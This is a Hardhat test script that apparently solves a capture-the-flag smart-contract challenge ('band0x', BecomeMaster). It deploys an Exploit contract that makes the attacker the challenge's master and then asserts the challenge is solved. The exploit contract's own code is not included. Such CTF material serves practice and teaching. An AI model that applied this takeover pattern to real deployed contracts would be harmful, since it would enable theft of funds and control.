import { Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { expect } from "chai";
import { SETUP_band0x, CHALLENGE_band0x} from "../../scripts/addresses"

let accounts: Signer[];
let attacker: Signer;
let attackerAddress: string;
let exploit: Contract;
let setup: Contract; 
let challenge: Contract;
let tx: any;

before(async () => {
    [attacker] = await ethers.getSigners();
    attackerAddress = await attacker.getAddress();
    setup = (await ethers.getContractAt(`contracts/band0x/Setup.sol:Setup`, SETUP_band0x)).connect(attacker);
    challenge = await ethers.getContractAt(`contracts/band0x/BecomeMaster.sol:BecomeMaster`, setup.instance());
});

it("prints contract address", async function () {
    const addr = await challenge.address;
    expect(addr).to.eq(CHALLENGE_band0x);
});

it("info", async function () {
    
});

it("exploit", async () => {
    await challenge.allocate();
    let master = await challenge.master();
    exploit = await (await ethers.getContractFactory(`contracts/band0x/Exploit.sol:Exploit`, attacker)).deploy(challenge.address);
    expect(await challenge.master()).to.eq(attackerAddress);
    // method 1 should also work
    //await exploit.finalize();
    // method 2
    // await challenge.sendAllocation(setup.address);
    expect(await setup.isSolved()).to.eq(true);
});